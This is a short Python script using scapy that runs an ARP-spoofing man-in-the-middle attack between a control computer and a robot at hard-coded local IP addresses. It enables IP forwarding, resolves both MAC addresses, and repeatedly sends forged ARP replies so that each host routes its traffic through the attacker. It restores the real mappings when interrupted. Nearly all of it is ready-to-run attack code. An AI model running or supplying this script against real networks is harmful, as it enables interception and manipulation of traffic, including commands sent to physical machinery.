#!/usr/bin/python
from scapy.all import *
import sys
import os
import time

try:
    interface = "enp0s3"#raw_input("[*] Enter desired interface: ")
    controlIP = "192.168.1.241"#raw_input("[*] Enter control IP: ")
    robotIP = "192.168.1.122"#raw_input("[*] Enter robot IP: ")
except KeyboardInterrupt:
    print "\n[*] User requested shutdown"
    print "[*] Exiting..."
    sys.exit(1)
    
print "\n[*] Enabling IP forwarding... \n"
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


def get_mac(IP):
    """ Get MAC address """
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")
        
        
def reARP():
    """ Re-ARP the targets """
    print "\n[*] Restoring targets..."
    controlMAC = get_mac(controlIP)
    robotMAC = get_mac(robotIP)
    send(ARP(op = 2, pdst = robotIP, psrc = controlIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = controlMAC), count = 7)
    send(ARP(op = 2, pdst = controlIP, psrc = robotIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = robotMAC), count = 7)
    print "\n[*] Disabling IP forwarding..."
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print "\n[*] Shutting down..."
    sys.exit(1)
    
    
def trick(gm, vm):
    """ Tell control we are robot, tell robot we are control """
    send(ARP(op=2, pdst=controlIP, psrc=robotIP, hwdst=vm))
    send(ARP(op=2, pdst=robotIP, psrc=controlIP, hwdst=gm))
    

    
def mitm():
    try:
        controlMAC = get_mac(controlIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print "\n[!] Could not find control computer MAC address"
        print "[!] Exiting..."
        sys.exit(1)
    try:
        robotMAC = get_mac(robotIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print "\n[!] Could not find robot MAC address"
        print "[!] Exiting..."
        sys.exit(1)
    print "[*] Poisoning Targets..."
    while 1:
        try:
            trick(robotMAC, controlMAC)
            time.sleep(1.5)
        except KeyboardInterrupt:
            reARP()
            break
            
mitm()
